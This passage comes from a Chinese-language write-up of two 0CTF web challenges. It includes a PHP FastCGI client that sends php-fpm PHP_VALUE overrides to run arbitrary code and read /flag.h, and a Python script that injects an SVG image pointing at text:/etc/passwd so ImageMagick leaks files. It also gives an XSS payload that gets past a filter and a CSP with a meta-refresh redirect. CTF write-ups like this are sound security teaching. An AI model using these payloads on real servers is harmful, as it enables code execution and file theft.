</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        do {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            $resp = $this-&gt;readPacket();
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            if ($resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                $response .= $resp[&#39;content&#39;];
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        } while ($resp &amp;&amp; $resp[&#39;type&#39;] != self::END_REQUEST);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        if (!is_array($resp)) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            throw new Exception(&#39;Bad request&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>       
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        switch (ord($resp[&#39;content&#39;][4])) {
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            case self::CANT_MPX_CONN:
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                throw new Exception(&#39;This app cant multiplex [CANT_MPX_CONN]&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                break;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            case self::OVERLOADED:
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                throw new Exception(&#39;New request rejected; too busy [OVERLOADED]&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                break;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            case self::UNKNOWN_ROLE:
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                throw new Exception(&#39;Role value not known [UNKNOWN_ROLE]&#39;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                break;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            case self::REQUEST_COMPLETE:
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                return $response;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    }
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$client = new AA(&#34;unix:///var/run/php-fpm.sock&#34;);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$req = &#39;/var/www/html/index.php&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$uri = $req .&#39;?&#39;.&#39;command=ls&#39;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>var_dump($client);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$code = &#34;&lt;?php var_dump(scandir(&#39;/&#39;));echo base64_encode(file_get_contents(&#39;/flag.h&#39;));</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>n?&gt;&#34;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$php_value = &#34;allow_url_include = On</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>nopen_basedir = /</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>nauto_prepend_file = php://input&#34;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>$params = array(       
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SCRIPT_FILENAME&#39;   =&gt; &#39;/var/www/html/index.php&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SCRIPT_NAME&#39;       =&gt; &#39;/var/www/html/index.php&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;QUERY_STRING&#39;      =&gt; &#39;command=ls&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;REQUEST_URI&#39;       =&gt; $uri,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;DOCUMENT_URI&#39;      =&gt; $req,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        #&#39;DOCUMENT_ROOT&#39;     =&gt; &#39;/&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;PHP_VALUE&#39;         =&gt; $php_value,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;asd&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SERVER_NAME&#39;       =&gt; &#39;localhost&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#39;CONTENT_LENGTH&#39;    =&gt; strlen($code)
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>);
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>echo &#34;Call: $uri</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>n</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>n&#34;;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>var_dump($client-&gt;request($params, $code));
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ret <span style=color:#ff79c6>=</span> execute_php_code(code)
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(ret)
</span></span></code></pre></div><p>然后可以发现根目录的 <code>flag.so</code> 和 <code>flag.h</code>, 读取后 strings 一下就能读到 flag. 不过可以看到是与 ffi 有关的, 所以这做法应该是非预期了, 不过之后又上了个 noeasyphp 修了几个非预期解.<br>最后试了下用 ffi 拿 flag,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$ffi</span> <span style=color:#ff79c6>=</span> FFI<span style=color:#ff79c6>::</span><span style=color:#50fa7b>load</span>(<span style=color:#f1fa8c>&#34;/flag.h&#34;</span>);
</span></span><span style=display:flex><span>var_dump(<span style=color:#8be9fd;font-style:italic>$ffi</span>);
</span></span><span style=display:flex><span>var_dump(<span style=color:#8be9fd;font-style:italic>$ffi</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>flag_fUn3t1on_fFi</span>());
</span></span></code></pre></div><p>也是能读到 flag 的, 不过这方法名和文件名是怎么预期得到呢, 猜测可能需要用 ffi 的功能去直接越界读内存? 感觉预期解更有意思一点.</p><h2 id=wechat-generator>Wechat Generator</h2><p>大概功能如下:</p><ol><li>前端提交对话到后端, 后端返回生成的 svg 和对应的 id 到前端预览</li><li>前端提交 id 到后端, 渲染 svg 到图片</li></ol><p>问题出在生成, 有个功能是插入表情, 比如 <code>[cool]</code>, 会被替换为</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;image</span> <span style=color:#50fa7b>x=</span><span style=color:#f1fa8c>&#34;1240&#34;</span> <span style=color:#50fa7b>y=</span><span style=color:#f1fa8c>&#34;-60&#34;</span> <span style=color:#50fa7b>height=</span><span style=color:#f1fa8c>&#34;100&#34;</span> <span style=color:#50fa7b>xmlns:xlink=</span><span style=color:#f1fa8c>&#34;http://www.w3.org/1999/xlink&#34;</span> <span style=color:#50fa7b>xlink:href=</span><span style=color:#f1fa8c>&#34;http://pwnable.org:5000/static/emoji/cool&#34;</span><span style=color:#ff79c6>/&gt;</span>
</span></span></code></pre></div><p>显然可能存在注入, 我们输入 <code>[cool">&lt;a>&lt;/a>&lt;a href="]</code>, 就成功注入了 <code>&lt;a>&lt;/a></code> 到 svg 里面. 这里可以想到之前空指针的一道题, imagemagick 在对 <code>text:/</code> 协议解析时, 会直接读取文件里的内容, 于是我们就能通过这个方式, 注入一个图片, 链接到 <code>text:/etc/passwd</code>, 之后就能通过后端渲染得到的图片, 得到文件内容.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sess <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>[{&#34;type&#34;:0,&#34;message&#34;:&#34;Love you!&lt;a&gt;asd&lt;/a&gt;[cool</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;/&gt;&lt;image xlink:href=</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;text:/etc/passwd</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34; x=&#39;-400px&#39; y=&#39;400px&#39; height=&#39;1500px&#39; width=&#39;1500px&#39;/&gt;&lt;a href=</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;]&#34;},{&#34;type&#34;:1,&#34;message&#34;:&#34;Me too!!!&#34;}]
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://pwnable.org:5000/preview&#39;</span>, data<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#39;data&#39;</span>: d})
</span></span><span style=display:flex><span>svg <span style=color:#ff79c6>=</span> base64<span style=color:#ff79c6>.</span>b64decode(res<span style=color:#ff79c6>.</span>json()[<span style=color:#f1fa8c>&#39;data&#39;</span>][<span style=color:#8be9fd;font-style:italic>len</span>(<span style=color:#f1fa8c>&#39;data:image/svg+xml;base64,&#39;</span>):])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;1.svg&#39;</span>, <span style=color:#f1fa8c>&#39;wb&#39;</span>) <span style=color:#ff79c6>as</span> f:
</span></span><span style=display:flex><span>    f<span style=color:#ff79c6>.</span>write(svg)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pid <span style=color:#ff79c6>=</span> res<span style=color:#ff79c6>.</span>json()[<span style=color:#f1fa8c>&#39;previewid&#39;</span>]
</span></span><span style=display:flex><span>res <span style=color:#ff79c6>=</span> sess<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>&#39;http://pwnable.org:5000/share&#39;</span>, data<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#39;previewid&#39;</span>: pid})
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>print</span>(res<span style=color:#ff79c6>.</span>text)
</span></span></code></pre></div><p>这里注意, 注入的内容前面一定要跟点东西, 不能直接这样 <code>[">&lt;a>&lt;/a>&lt;a href="]</code>, 因为 <code>http://pwnable.org:5000/static/emoji/</code>, 返回的是 404, 而 <code>http://pwnable.org:5000/static/emoji/随意的内容</code> 返回的是微笑. 如果什么都没有, imagemagick 得到 404 的话, 解析会直接中止.</p><p>现在就能读取文件了, 结合后端是 python, 然后一顿测试, 得到应用在 <code>/app/app.py</code>, 可惜这里因为 imagemagick 的问题, 能读的源码有限, 调大图片尺寸也只能得到放大的文字, 不能显示更多的文字.</p><p>部分源码:</p><p><img src=https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png alt></p><p>访问 <code>http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>, 然后题目一转 xss&mldr; 要求 alert(1).<br>因为这里有 csp 限制, 没法直接在 svg 里面用 script alert, 导致这里卡了挺久, 然后发现 imagemagick 生成的文件拓展名是可控的, 也就是第二步, 得到图片的路径是 <code>http://pwnable.org:5000/image/gzVIsH/png</code>, 修改最后的 png 到 svg, 就会如蜜传如蜜, 直接输出一张的 svg, 而且 content-type 也会改变. 不过这里后端限制了扩展名长度只能为 3, 否则会直接报错.<br>这里查看文档, 发现 imagemagick 是支持输出 htm 的, <code>http://pwnable.org:5000/image/gzVIsH/htm</code> 得到的就是 htm, content-type 也变成了 <code>text/html</code>. 于是 xss 思路就来了, 看到源码的过滤是直接替换为空, 可以用喜闻乐见的双写绕过.<br>然后在 svg 里面把最外面的 svg tag 给闭合了, 插入一个 html tag, 再用 meta 标签跳到我们的站上 alert(1) 即可, 这样就绕过了 csp.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>d <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>[{&#34;type&#34;:0,&#34;message&#34;:&#34;Love you!&lt;a&gt;asd&lt;/a&gt;[cool</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;html&gt;&lt;metmetaa http-equiv=&#39;refresh&#39; content=</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;0;URL=&#39;http://site.com/&#39;</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34; /&gt;&lt;/html&gt;&lt;a href=</span><span style=color:#f1fa8c>\\</span><span style=color:#f1fa8c>&#34;]&#34;},{&#34;type&#34;:1,&#34;message&#34;:&#34;Me too!!!&#34;}]
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
</span></span></code></pre></div><p>不过感觉可能也是非预期? 因为看源码还有个可控 callback name 的 jsonp 没用上.</p><p>PS. 这里其实可以直接读 /proc/self/environ 来读环境变量, 可惜 imagemagick 碰到 \x00 就停止读取了, 导致只能读取第一个环境变量 PATH, 都不到后面的 flag</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/0ctf>0ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>